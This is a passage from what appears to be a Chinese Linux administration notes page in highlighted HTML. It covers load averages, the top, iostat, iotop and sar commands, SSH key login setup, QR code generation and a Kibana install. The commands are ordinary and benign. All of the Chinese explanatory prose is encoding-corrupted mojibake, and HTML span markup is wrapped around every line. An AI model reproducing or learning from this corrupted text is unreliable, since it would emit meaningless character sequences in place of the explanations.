å·²è¢«å æ»¡ï¼Œä½†ç³»ç»Ÿè¿˜æ˜¯èƒ½é¡ºç•…è¿ä½œçš„</span><br><span class="line">load=<span class="number">1.5</span>, CPU å¤„ç†äº† <span class="number">100</span> ä¸ªè¿›ç¨‹ï¼Œè¿˜æœ‰ <span class="number">50</span> ä¸ªè¿›ç¨‹æ­£åœ¨æ’é™¤ç­‰ç€ CPU å¤„ç†ï¼Œè¿™æ—¶ï¼ŒCPU å·²ç»è¶…è´Ÿè·å·¥ä½œäº†</span><br><span class="line">ä¸ºäº†ç³»ç»Ÿé¡ºç•…è¿è¡Œï¼Œload å€¼æœ€å¥½ä¸è¦è¶…è¿‡ <span class="number">1.0</span>ï¼Œè¿™æ ·å°±æ²¡æœ‰è¿›ç¨‹éœ€è¦ç­‰å¾…äº†ï¼Œæ‰€æœ‰è¿›ç¨‹éƒ½èƒ½ç¬¬ä¸€æ—¶é—´å¾—åˆ°å¤„ç†ã€‚\</span><br><span class="line">å¾ˆæ˜¾ç„¶ï¼Œ<span class="number">1.0</span> æ˜¯ä¸€ä¸ªå…³é”®å€¼ï¼Œè¶…è¿‡è¿™ä¸ªå€¼ï¼Œç³»ç»Ÿå°±ä¸åœ¨æœ€ä½³çŠ¶æ€äº†ã€‚ ä¸€èˆ¬ <span class="number">0.7</span> æ˜¯ä¸€ä¸ªæ¯”è¾ƒç†æƒ³çš„å€¼ã€‚\</span><br><span class="line">å¦å¤–ï¼Œload å€¼çš„å¥åº·çŠ¶æ€è¿˜è·Ÿç³»ç»Ÿ CPU æ ¸å¿ƒæ•°ç›¸å…³ï¼Œå¦‚æœ CPU æ ¸å¿ƒæ•°ä¸º <span class="number">2</span>ï¼Œé‚£ä¹ˆ load å€¼å¥åº·å€¼åº”è¯¥ä¸º <span class="number">2</span>ï¼Œä»¥æ­¤ç±»æ¨ã€‚ \</span><br><span class="line">è¯„ä»·ç³»ç»Ÿçš„è´Ÿè½½ä¸€èˆ¬é‡‡ç”¨ <span class="number">15</span> åˆ†é’Ÿå†…çš„é‚£ä¸ªå¹³å‡è´Ÿè½½å€¼ã€‚</span><br><span class="line"></span><br><span class="line">äºŒã€w å‘½ä»¤</span><br><span class="line"></span><br><span class="line">$ w\</span><br><span class="line"> <span class="number">17</span>:<span class="number">47</span>:<span class="number">40</span> up <span class="number">69</span> days,  <span class="number">6</span>:<span class="number">24</span>,  <span class="number">1</span> user,  load average: <span class="number">0.46</span>, <span class="number">0.26</span>, <span class="number">0.25</span>\</span><br><span class="line">USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT\</span><br><span class="line">lvinkim  pts/<span class="number">0</span>    <span class="number">14.18</span><span class="number">.144</span><span class="number">.2</span>      <span class="number">15</span>:<span class="number">55</span>    <span class="number">0.00</span>s  <span class="number">0.02</span>s  <span class="number">0.00</span>s w</span><br><span class="line">ç¬¬ <span class="number">1</span> è¡Œï¼šä¸ uptime ä¸€ç›¸åŒã€‚ \</span><br><span class="line">ç¬¬ <span class="number">2</span> è¡Œä»¥ä¸‹ï¼Œå½“å‰ç™»å½•ç”¨æˆ·çš„åˆ—è¡¨ã€‚</span><br><span class="line"></span><br><span class="line">ä¸‰ã€top å‘½ä»¤</span><br><span class="line"></span><br><span class="line">$ top\</span><br><span class="line">top - <span class="number">17</span>:<span class="number">51</span>:<span class="number">23</span> up <span class="number">69</span> days,  <span class="number">6</span>:<span class="number">28</span>,  <span class="number">1</span> user,  load average: <span class="number">0.31</span>, <span class="number">0.30</span>, <span class="number">0.26</span>\</span><br><span class="line">Tasks:  <span class="number">99</span> total,   <span class="number">1</span> running,  <span class="number">98</span> sleeping,   <span class="number">0</span> stopped,   <span class="number">0</span> zombie\</span><br><span class="line">Cpu(s):  <span class="number">2.3</span>%us,  <span class="number">0.2</span>%sy,  <span class="number">0.0</span>%ni, <span class="number">97.4</span>%id,  <span class="number">0.0</span>%wa,  <span class="number">0.0</span>%hi,  <span class="number">0.0</span>%si,  <span class="number">0.0</span>%st\</span><br><span class="line">Mem:   <span class="number">1922244</span>k total,  <span class="number">1737480</span>k used,   <span class="number">184764</span>k free,   <span class="number">208576</span>k buffers\</span><br><span class="line">Swap:        <span class="number">0</span>k total,        <span class="number">0</span>k used,        <span class="number">0</span>k free,   <span class="number">466732</span>k cached\</span><br><span class="line">\</span><br><span class="line">  PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND                                                                \</span><br><span class="line">    <span class="number">1</span> root      <span class="number">20</span>   <span class="number">0</span> <span class="number">19232</span> <span class="number">1004</span>  <span class="number">708</span> S  <span class="number">0.0</span>  <span class="number">0.1</span>   <span class="number">0</span>:<span class="number">01.17</span> init                                                                    \</span><br><span class="line">    <span class="number">2</span> root      <span class="number">20</span>   <span class="number">0</span>     <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> S  <span class="number">0.0</span>  <span class="number">0.0</span>   <span class="number">0</span>:<span class="number">00.01</span> kthreadd                                                                \</span><br><span class="line">...</span><br><span class="line">ç¬¬ <span class="number">1</span> è¡Œï¼šä¸ uptime ä¸€ç›¸åŒã€‚</span><br><span class="line"></span><br><span class="line">ç¬¬ <span class="number">2</span> è¡Œï¼šè¿›ç¨‹æ•°ä¿¡æ¯ã€‚</span><br><span class="line"></span><br><span class="line">Tasks: <span class="number">99</span> total : æ€»å…±æœ‰ <span class="number">99</span> ä¸ªè¿›ç¨‹</span><br><span class="line"><span class="number">1</span> running : <span class="number">1</span> ä¸ªè¿›ç¨‹æ­£åœ¨å ç”¨ CPU</span><br><span class="line"><span class="number">98</span> sleeping : <span class="number">98</span> ä¸ªç¡çœ è¿›ç¨‹</span><br><span class="line"><span class="number">0</span> stopped : <span class="number">0</span> ä¸ªåœæ­¢çš„è¿›ç¨‹</span><br><span class="line"><span class="number">0</span> zombie : <span class="number">0</span> ä¸ªåƒµå°¸è¿›ç¨‹</span><br><span class="line">ç¬¬ <span class="number">3</span> è¡Œ : CPU ä½¿ç”¨ç‡</span><br><span class="line"></span><br><span class="line">us (user): é nice ç”¨æˆ·è¿›ç¨‹å ç”¨ CPU çš„æ¯”ç‡</span><br><span class="line">sy (system): å†…æ ¸ã€å†…æ ¸è¿›ç¨‹å ç”¨ CPU çš„æ¯”ç‡</span><br><span class="line">ni (nice): ç”¨æˆ·è¿›ç¨‹ç©ºé—´å†…æ”¹å˜è¿‡ä¼˜å…ˆçº§çš„è¿›ç¨‹å ç”¨ CPU æ¯”ç‡</span><br><span class="line">id (idle): CPU ç©ºé—²æ¯”ç‡ï¼Œå¦‚æœç³»ç»Ÿç¼“æ…¢è€Œè¿™ä¸ªå€¼å¾ˆé«˜ï¼Œè¯´æ˜ç³»ç»Ÿæ…¢çš„åŸå› ä¸æ˜¯ CPU è´Ÿè½½é«˜</span><br><span class="line">wa (iowait): CPU ç­‰å¾…æ‰§è¡Œ I/O æ“ä½œçš„æ—¶é—´æ¯”ç‡ï¼Œè¯¥æŒ‡æ ‡å¯ä»¥ç”¨æ¥æ’æŸ¥ç£ç›˜ I/O çš„é—®é¢˜ï¼Œé€šå¸¸ç»“åˆ wa å’Œ id åˆ¤æ–­</span><br><span class="line">hi (Hardware IRQ): CPU å¤„ç†ç¡¬ä»¶ä¸­æ–­æ‰€å æ—¶é—´çš„æ¯”ç‡</span><br><span class="line">si (Software Interrupts): CPU å¤„ç†è½¯ä»¶ä¸­æ–­æ‰€å æ—¶é—´çš„æ¯”ç‡</span><br><span class="line">st (steal): æµé€çš„æ—¶é—´ï¼Œè™šæ‹Ÿæœºä¸­çš„å…¶ä»–ä»»åŠ¡æ‰€å  CPU æ—¶é—´çš„æ¯”ç‡</span><br><span class="line">éœ€è¦æ³¨æ„çš„ä¸€äº›æƒ…å½¢ï¼š</span><br><span class="line"></span><br><span class="line">ç”¨æˆ·è¿›ç¨‹ us å æ¯”é«˜ï¼ŒI/O æ“ä½œ wa ä½ï¼šè¯´æ˜ç³»ç»Ÿç¼“æ…¢çš„åŸå› åœ¨äºè¿›ç¨‹å ç”¨å¤§é‡ CPUï¼Œé€šå¸¸è¿˜ä¼šä¼´æœ‰æ•™ä½çš„ç©ºé—²æ¯”ç‡ idï¼Œè¯´æ˜ CPU ç©ºè½¬æ—¶é—´å¾ˆå°‘ã€‚</span><br><span class="line">I/O æ“ä½œ wa ä½ï¼Œç©ºé—²æ¯”ç‡ id é«˜ï¼šå¯ä»¥æ’é™¤ CPU èµ„æºç“¶é¢ˆçš„å¯èƒ½ã€‚</span><br><span class="line">I/O æ“ä½œ wa é«˜ï¼šè¯´æ˜ I/O å ç”¨äº†å¤§é‡çš„ CPU æ—¶é—´ï¼Œéœ€è¦æ£€æŸ¥äº¤æ¢ç©ºé—´çš„ä½¿ç”¨ï¼Œäº¤æ¢ç©ºé—´ä½äºç£ç›˜ä¸Šï¼Œæ€§èƒ½è¿œä½äºå†…å­˜ï¼Œå½“å†…å­˜è€—å°½å¼€å§‹ä½¿ç”¨äº¤æ¢ç©ºé—´æ—¶ï¼Œå°†ä¼šç»™æ€§èƒ½å¸¦æ¥ä¸¥é‡å½±å“ï¼Œæ‰€ä»¥å¯¹äºæ€§èƒ½è¦æ±‚è¾ƒé«˜çš„æœåŠ¡å™¨ï¼Œä¸€èˆ¬å»ºè®®å…³é—­äº¤æ¢ç©ºé—´ã€‚å¦ä¸€æ–¹é¢ï¼Œå¦‚æœå†…å­˜å……è¶³ï¼Œä½† wa å¾ˆé«˜ï¼Œè¯´æ˜éœ€è¦æ£€æŸ¥å“ªä¸ªè¿›ç¨‹å ç”¨äº†å¤§é‡çš„ I/O èµ„æºã€‚</span><br><span class="line">æ›´å¤šè´Ÿè½½æƒ…å½¢ï¼Œå¯åœ¨å®é™…ä¸­çµæ´»åˆ¤æ–­ã€‚</span><br><span class="line"></span><br><span class="line">å››ã€iostat å‘½ä»¤</span><br><span class="line"></span><br><span class="line">iostat å‘½ä»¤å¯ä»¥æŸ¥çœ‹ç³»ç»Ÿåˆ†åŒºçš„ IO ä½¿ç”¨æƒ…å†µ</span><br><span class="line"></span><br><span class="line">$ iostat \</span><br><span class="line">Linux <span class="number">2.6</span><span class="number">.32</span><span class="number">-573.22</span><span class="number">.1</span>.el6.x86_64 (sgs02)   <span class="number">01</span>/<span class="number">20</span>/<span class="number">2017</span>     _x86_64_   (<span class="number">1</span> CPU)\</span><br><span class="line">\</span><br><span class="line">avg-cpu:  %user   %nice %system %iowait  %steal   %idle\</span><br><span class="line">           <span class="number">2.29</span>    <span class="number">0.00</span>    <span class="number">0.25</span>    <span class="number">0.04</span>    <span class="number">0.00</span>   <span class="number">97.41</span>\</span><br><span class="line">\</span><br><span class="line">Device:            tps   Blk_read/s   Blk_wrtn/s   Blk_read   Blk_wrtn\</span><br><span class="line">vda               <span class="number">1.15</span>         <span class="number">3.48</span>        <span class="number">21.88</span>   <span class="number">21016084</span>  <span class="number">131997520</span></span><br><span class="line">ä¸€äº›å€¼å¾—æ³¨æ„çš„ IO æŒ‡æ ‡ :</span><br><span class="line"></span><br><span class="line">Device : ç£ç›˜åç§°</span><br><span class="line">tps : æ¯ç§’ I/O ä¼ è¾“è¯·æ±‚é‡</span><br><span class="line">Blk_read/s : æ¯ç§’è¯»å–å¤šå°‘å—ï¼ŒæŸ¥çœ‹å—å¤§å°å¯å‚è€ƒå‘½ä»¤ tune2fs</span><br><span class="line">Blk_wrtn/s : æ¯ç§’å†™å–å¤šå°‘å—</span><br><span class="line">Blk_read : ä¸€å…±è¯»äº†å¤šå°‘å—</span><br><span class="line">â€“Blk_wrtn : ä¸€å…±å†™äº†å¤šå°‘å—</span><br><span class="line">äº”ã€iotop å‘½ä»¤</span><br><span class="line"></span><br><span class="line">iotop å‘½ä»¤ç±»ä¼¼äº top å‘½ä»¤ï¼Œä½†æ˜¯æ˜¾ç¤ºçš„æ˜¯å„ä¸ªè¿›ç¨‹çš„ I/O æƒ…å†µï¼Œå¯¹äºå®šä½ I/O æ“ä½œè¾ƒé‡çš„è¿›ç¨‹æœ‰æ¯”è¾ƒå¤§çš„ä½œç”¨ã€‚\</span><br><span class="line"></span><br><span class="line"># iotop\</span><br><span class="line">Total DISK READ: <span class="number">0.00</span> B/s | Total DISK WRITE: <span class="number">774.52</span> K/s\</span><br><span class="line">  TID  PRIO  USER     DISK READ  DISK WRITE  SWAPIN     IO&gt;    COMMAND                                                                \</span><br><span class="line">  <span class="number">272</span> be/<span class="number">3</span> root        <span class="number">0.00</span> B/s    <span class="number">0.00</span> B/s  <span class="number">0.00</span> %  <span class="number">4.86</span> % [jbd2/vda1<span class="number">-8</span>]\</span><br><span class="line"> <span class="number">9072</span> be/<span class="number">4</span> mysql       <span class="number">0.00</span> B/s  <span class="number">268.71</span> K/s  <span class="number">0.00</span> %  <span class="number">0.00</span> % mysqld\</span><br><span class="line"> <span class="number">5058</span> be/<span class="number">4</span> lvinkim     <span class="number">0.00</span> B/s    <span class="number">3.95</span> K/s  <span class="number">0.00</span> %  <span class="number">0.00</span> % php-fpm: pool www\</span><br><span class="line">    <span class="number">1</span> be/<span class="number">4</span> root        <span class="number">0.00</span> B/s    <span class="number">0.00</span> B/s  <span class="number">0.00</span> %  <span class="number">0.00</span> % init</span><br><span class="line">å¯ä»¥çœ‹åˆ°ä¸åŒä»»åŠ¡çš„è¯»å†™å¼ºåº¦ã€‚</span><br><span class="line"></span><br><span class="line">å…­ã€sysstat å·¥å…·</span><br><span class="line"></span><br><span class="line">å¾ˆå¤šæ—¶å€™å½“æ£€æµ‹åˆ°æˆ–è€…çŸ¥é“å†å²çš„é«˜è´Ÿè½½çŠ¶å†µæ—¶ï¼Œå¯èƒ½éœ€è¦å›æ”¾å†å²ç›‘æ§æ•°æ®ï¼Œè¿™æ—¶ sar å‘½ä»¤å°±æ´¾ä¸Šç”¨åœºäº†ï¼Œsar å‘½ä»¤åŒæ ·æ¥è‡ª sysstat å·¥å…·åŒ…ï¼Œå¯ä»¥è®°å½•ç³»ç»Ÿçš„ CPU è´Ÿè½½ã€I/O çŠ¶å†µå’Œå†…å­˜ä½¿ç”¨è®°å½•ï¼Œä¾¿äºå†å²æ•°æ®çš„å›æ”¾ã€‚</span><br><span class="line"></span><br><span class="line">sysstat çš„é…ç½®æ–‡ä»¶åœ¨ /etc/sysconfig/sysstat æ–‡ä»¶ï¼Œå†å²æ—¥å¿—çš„å­˜æ”¾ä½ç½®ä¸º /<span class="keyword">var</span>/log/sa\</span><br><span class="line">ç»Ÿè®¡ä¿¡æ¯éƒ½æ˜¯æ¯ <span class="number">10</span> åˆ†é’Ÿè®°å½•ä¸€æ¬¡ï¼Œæ¯å¤©çš„ <span class="number">23</span>:<span class="number">59</span> ä¼šåˆ†å‰²ç»Ÿè®¡æ–‡ä»¶ï¼Œè¿™äº›æ“ä½œçš„é¢‘ç‡éƒ½åœ¨ /etc/cron.d/sysstat æ–‡ä»¶é…ç½®ã€‚\</span><br><span class="line"></span><br><span class="line">ä¸ƒã€sar å‘½ä»¤</span><br><span class="line"></span><br><span class="line">ä½¿ç”¨ sar å‘½ä»¤æŸ¥çœ‹å½“å¤© CPU ä½¿ç”¨ï¼š</span><br><span class="line"></span><br><span class="line">$ sar\</span><br><span class="line">Linux <span class="number">2.6</span><span class="number">.32</span><span class="number">-431.23</span><span class="number">.3</span>.el6.x86_64 (szs01)   <span class="number">01</span>/<span class="number">20</span>/<span class="number">2017</span>     _x86_64_   (<span class="number">1</span> CPU)\</span><br><span class="line">\</span><br><span class="line"><span class="number">10</span>:<span class="number">50</span>:<span class="number">01</span> AM     CPU     %user     %nice   %system   %iowait    %steal     %idle\</span><br><span class="line"><span class="number">11</span>:<span class="number">00</span>:<span class="number">01</span> AM     all      <span class="number">0.45</span>      <span class="number">0.00</span>      <span class="number">0.22</span>      <span class="number">0.40</span>      <span class="number">0.00</span>     <span class="number">98.93</span>\</span><br><span class="line">Average:        all      <span class="number">0.45</span>      <span class="number">0.00</span>      <span class="number">0.22</span>      <span class="number">0.40</span>      <span class="number">0.00</span>     <span class="number">98.93</span></span><br><span class="line">ä½¿ç”¨ sar å‘½ä»¤æŸ¥çœ‹å½“å¤©å†…å­˜ä½¿ç”¨ï¼š</span><br><span class="line"></span><br><span class="line">$ sar -r\</span><br><span class="line">Linux <span class="number">2.6</span><span class="number">.32</span><span class="number">-431.23</span><span class="number">.3</span>.el6.x86_64 (szs01)   <span class="number">01</span>/<span class="number">20</span>/<span class="number">2017</span>     _x86_64_   (<span class="number">1</span> CPU)\</span><br><span class="line">\</span><br><span class="line"><span class="number">10</span>:<span class="number">50</span>:<span class="number">01</span> AM kbmemfree kbmemused  %memused kbbuffers  kbcached  kbcommit   %commit\</span><br><span class="line"><span class="number">11</span>:<span class="number">00</span>:<span class="number">01</span> AM     <span class="number">41292</span>    <span class="number">459180</span>     <span class="number">91.75</span>     <span class="number">44072</span>    <span class="number">164620</span>    <span class="number">822392</span>    <span class="number">164.32</span>\</span><br><span class="line">Average:        <span class="number">41292</span>    <span class="number">459180</span>     <span class="number">91.75</span>     <span class="number">44072</span>    <span class="number">164620</span>    <span class="number">822392</span>    <span class="number">164.32</span></span><br><span class="line">ä½¿ç”¨ sar å‘½ä»¤æŸ¥çœ‹å½“å¤© IO ç»Ÿè®¡è®°å½•ï¼š</span><br><span class="line"></span><br><span class="line">$ sar -b\</span><br><span class="line">Linux <span class="number">2.6</span><span class="number">.32</span><span class="number">-431.23</span><span class="number">.3</span>.el6.x86_64 (szs01)   <span class="number">01</span>/<span class="number">20</span>/<span class="number">2017</span>     _x86_64_   (<span class="number">1</span> CPU)\</span><br><span class="line">\</span><br><span class="line"><span class="number">10</span>:<span class="number">50</span>:<span class="number">01</span> AM       tps      rtps      wtps   bread/s   bwrtn/s\</span><br><span class="line"><span class="number">11</span>:<span class="number">00</span>:<span class="number">01</span> AM      <span class="number">3.31</span>      <span class="number">2.14</span>      <span class="number">1.17</span>     <span class="number">37.18</span>     <span class="number">16.84</span>\</span><br><span class="line">Average:         <span class="number">3.31</span>      <span class="number">2.14</span>      <span class="number">1.17</span>     <span class="number">37.18</span>     <span class="number">16.84</span></span><br><span class="line">https:<span class="comment">//learnku.com/articles/31718</span></span><br></pre></td></tr></table></figure>
<h3 id="ç§˜é’¥ç™»å½•"><a href="#ç§˜é’¥ç™»å½•" class="headerlink" title="ç§˜é’¥ç™»å½•"></a>ç§˜é’¥ç™»å½•</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">'youxiang@aliyun.com'</span></span><br><span class="line">scp -P &lt;ç«¯å£å·&gt; ~<span class="regexp">/.ssh/i</span>d_rsa.pub &lt;ç”¨æˆ·å&gt;@&lt;ipåœ°å€&gt;:<span class="regexp">/home/i</span>d_rsa.pub</span><br><span class="line">cat /home/id_rsa.pub &gt;&gt; ~<span class="regexp">/.ssh/</span>authorized_keys</span><br><span class="line"></span><br><span class="line">å¦‚æœåœ¨ å®¶ç›®å½• æ²¡æœ‰ .ssh ç›®å½•æˆ– authorized_keys æ–‡ä»¶ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸‹ï¼Œå¹¶æˆäºˆ authorized_keys æ–‡ä»¶ <span class="number">600</span> æƒé™</span><br><span class="line">ssh root@<span class="number">114.11</span><span class="number">.11</span><span class="number">.111</span></span><br><span class="line">vi ~<span class="regexp">/.ssh/</span>config</span><br><span class="line"></span><br><span class="line">Host            jd            #è‡ªå®šä¹‰åˆ«å</span><br><span class="line">HostName        114.11.11.110         #æ›¿æ¢ä¸ºä½ çš„sshæœåŠ¡å™¨ipæˆ–domain</span><br><span class="line">Port            22             #sshæœåŠ¡å™¨ç«¯å£ï¼Œé»˜è®¤ä¸º22</span><br><span class="line">User            root             #sshæœåŠ¡å™¨ç”¨æˆ·å</span><br><span class="line">IdentityFile    ~/.ssh/id_rsa    #ç¬¬ä¸€ä¸ªæ­¥éª¤ç”Ÿæˆçš„å…¬é’¥æ–‡ä»¶å¯¹åº”çš„ç§é’¥æ–‡ä»¶</span><br><span class="line">æ­¤æ—¶å°±å¯ä»¥ä½¿ç”¨ ssh jd è¿›è¡Œç™»å½•</span><br><span class="line">cd /etc/ssh/</span><br><span class="line"></span><br><span class="line">ä¿®æ”¹ SSH çš„é…ç½®æ–‡ä»¶ vi sshd_config</span><br><span class="line"></span><br><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">AuthorizedKeysFile      .ssh/authorized_keys</span><br><span class="line">#AuthorizedKeysCommand none</span><br><span class="line">#AuthorizedKeysCommandRunAs nobody</span><br><span class="line"></span><br><span class="line">#é»˜è®¤PasswordAuthentication ä¸ºyes,å³å…è®¸å¯†ç ç™»å½•ï¼Œæ”¹ä¸ºnoåï¼Œç¦æ­¢å¯†ç ç™»å½•</span><br><span class="line">PasswordAuthentication no </span><br><span class="line">é‡å¯ ssh æœåŠ¡</span><br><span class="line"></span><br><span class="line">systemctl restart sshd.service</span><br><span class="line">https:<span class="comment">//learnku.com/articles/30438</span></span><br></pre></td></tr></table></figure>
<h3 id="ç”ŸæˆäºŒç»´ç "><a href="#ç”ŸæˆäºŒç»´ç " class="headerlink" title="ç”ŸæˆäºŒç»´ç "></a>ç”ŸæˆäºŒç»´ç </h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">ç¬¬ä¸€ç§æ–¹æ³•ï¼š qrencode</span><br><span class="line">#å®‰è£…ï¼Œè®°å¾—åŠ epel yumæº</span><br><span class="line">[root@localhost ~]# yum install libpng libpng-devel qrencode -y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#æ ¼å¼</span><br><span class="line">Usage: qrencode [OPTION]... [STRING]</span><br><span class="line">OPTIONSï¼š</span><br><span class="line">-oï¼šè¾“å‡ºçš„äºŒç»´ç æ–‡ä»¶åã€‚å¦‚test.pngã€‚éœ€è¦ä»¥.pngç»“å°¾ã€‚-è¡¨ç¤ºè¾“å‡ºåˆ°æ§åˆ¶å°ã€‚</span><br><span class="line">-sï¼šæŒ‡å®šå›¾ç‰‡å¤§å°ã€‚é»˜è®¤ä¸º<span class="number">3</span>ä¸ªåƒç´ ã€‚</span><br><span class="line">-tï¼šæŒ‡å®šäº§ç”Ÿçš„å›¾ç‰‡ç±»å‹ã€‚é»˜è®¤ä¸ºPNGã€‚å¯ä»¥æ˜¯PNG/ANSI/ANSI256/ASCIIi/UTF8ç­‰ã€‚å¦‚æœéœ€è¦è¾“å‡ºåˆ°æ§åˆ¶å°ï¼Œå¯ä»¥ç”¨ANSIã€ANSI256ç­‰</span><br><span class="line">STRINGï¼šå¯ä»¥æ˜¯textã€urlç­‰</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#ä½¿ç”¨</span><br><span class="line">æ³¨ï¼šè¾“å‡ºçš„äºŒç»´ç å›¾ç‰‡å¤§å°å–å†³äºï¼Œå†…å®¹çš„å¤šå°‘ï¼Œä¸”ä¸èƒ½æ¢è¡Œ</span><br><span class="line"></span><br><span class="line"># å°†â€œhttp://jinchuang.orgâ€ç½‘å€è½¬æ¢ä¸ºäºŒç»´ç å¹¶ä¿å­˜åœ¨qrcode.pngå›¾ç‰‡ä¸­</span><br><span class="line">[root@localhost ~]# qrencode -o qrcode.png "http://jinchuang.org"</span><br><span class="line"></span><br><span class="line"># åœ¨ç»ˆç«¯ä¸‹æ— æ³•æŸ¥çœ‹pngå›¾ç‰‡ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨ANSIç”Ÿæˆ</span><br><span class="line">[root@localhost ~]# echo "your input words" | qrencode -o - -t ANSI</span><br><span class="line"></span><br><span class="line"># ä¹Ÿå¯ä»¥å°†éœ€è¦è½¬æ¢çš„æ–‡å­—ä¿å­˜ä¸ºxx.txtæ–‡ä»¶ï¼Œä¹‹åå†è½¬æ¢</span><br><span class="line">[root@localhost ~]# cat xx.txt | qrencode -o - -t ANSI</span><br><span class="line"></span><br><span class="line">ç¬¬äºŒç§æ–¹æ³•ï¼š</span><br><span class="line">[root@localhost ~]# printf "http://jinchuang.org" | curl -F-=\&lt;- qrenco.de</span><br></pre></td></tr></table></figure>
<h3 id="es-Kibana"><a href="#es-Kibana" class="headerlink" title="es Kibana"></a>es Kibana</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[root@localhost ~]# cd /source</span><br><span class="line">[root@localhost source]# wget https://artifacts.elastic.co/downloads/kibana/kibana-5.6.0-linux-x86_64.tar.gz</span><br><span class="line">[root@localhost source]# tar xf kibana-5.6.0-linux-x86_64.tar.gz  -C /elk/</span><br><span class="line">[root@localhost source]# cd /elk/</span><br><span class="line">[root@localhost elk]# mv kibana-5.6.0-linux-x86_64/ kibana</span><br><span class="line"></span><br><span class="line">#ä¿®æ”¹é…ç½®æ–‡ä»¶</span><br><span class="line">[root@localhost elk]# vim kibana/config/kibana.yml</span><br><span class="line">server.port: <span class="number">5601</span></span><br><span class="line">server.host: <span class="string">"0.0.0.0"</span></span><br><span class="line">elasticsearch.url: <span class="string">"http://127.0.0.1:9200"</span></span><br><span class="line"></span><br><span class="line">#å¯åŠ¨</span><br><span class="line">[root@localhost elk]# /elk/kibana/bin/kibana &amp;</span><br><span class="line">[<span class="number">1</span>] <span class="number">31948</span></span><br><span class="line">  log   [<span class="number">05</span>:<span class="number">53</span>:<span class="number">04.064</span>] [info][status][plugin:kibana@<span class="number">5.6</span><span class="number">.0</span>] Status changed <span class="keyword">from</span> uninitialized to green - Ready</span><br><span class="line">  log   [<span class="number">05</span>:<span class="number">53</span>:<span class="number">04.149</span>] [info][status][plugin:elasticsearch@<span class="number">5.6</span><span class="number">.0</span>] Status changed <span class="keyword">from</span> uninitialized to yellow - Waiting <span class="keyword">for</span> Elasticsearch</span><br><span class="line">  log   [<span class="number">05</span>:<span class="number">53</span>:<span class="number">04.190</span>] [info][status][plugin:<span class="built_in">console</span>@<span class="number">5.6</span><span class="number">.0</span>] Status changed <span class="keyword">from</span> uninitialized to green - Ready</span><br><span class="line">  log   [<span class="number">05</span>:<span class="number">53</span>:<span class="number">04.235</span>] [info][status][plugin:metrics@<span class="number">5.6</span><span class="number">.0</span>] Status changed <span class="keyword">from</span> uninitialized to green - Ready</span><br><span class="line">  log   [<span class="number">05</span>:<span class="number">53</span>:<span class="number">04.435</span>] [info][status][plugin:timelion@<span class="number">5.6</span><span class="number">.0</span>] Status changed <span class="keyword">from</span> uninitialized to green - Ready</span><br><span class="line">  log   [<span class="number">05</span>:<span class="number">53</span>:<span class="number">04.447</span>] [info][status][plugin:elasticsearch@<span class="number">5.6</span><span class="number">.0</span>] Status changed <span class="keyword">from</span> yellow to green - Kibana index ready</span><br><span class="line">  log   [<span class="number">05</span>:<span class="number">53</span>:<span class="number">04.449</span>] [info][listening] Server running at http:<span class="comment">//0.0.0.0:5601</span></span><br><span class="line">  log   [<span class="number">05</span>:<span class="number">53</span>:<span class="number">04.452</span>] [info][status][ui settings] Status changed <span class="keyword">from</span> uninitialized to green - Ready</span><br><span class="line"></span><br><span class="line">#æŸ¥çœ‹è¿›ç¨‹å’Œç«¯å£</span><br><span class="line">[root@localhost elk]# ps -ef|grep kibana</span><br><span class="line">root     <span class="number">31948</span> <span class="number">31038</span> <span class="number">12</span> <span class="number">13</span>:<span class="number">52</span> pts/<span class="number">3</span>    <span class="number">00</span>:<span class="number">00</span>:<span class="number">04</span> /elk/kibana/bin/../node/bin/node --no-warnings /elk/kibana/bin/../src/cli</span><br><span class="line"></span><br><span class="line">[root@localhost elk]# netstat -lntp </span><br><span class="line">Proto Recv-Q Send-Q Local Address           